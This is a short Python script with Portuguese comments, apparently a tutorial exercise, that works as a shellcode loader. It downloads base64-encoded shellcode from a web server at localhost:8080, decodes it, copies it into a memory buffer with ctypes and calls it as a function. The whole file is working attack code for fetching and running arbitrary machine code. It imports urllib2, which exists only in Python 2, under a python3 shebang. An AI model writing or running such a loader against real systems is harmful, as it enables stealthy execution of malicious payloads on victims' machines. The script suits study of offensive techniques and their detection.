#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Fri Oct 11 09:20:59 2019

@author: max
"""

import urllib2
import ctypes
import base64

# Obtém o shellcode de nosso servidor web
url = 'http://localhost:8080/shellcode.bin'
response = urllib2.urlopen(url)

# Decodifica o shellcode a partir de dados em base64
shellcode = base64.b64decode(response.read())

# Cria um buffer na memória
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# Cria um ponteirode função para o nosso shellcode
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# Chama nosso shellcode
shellcode_func()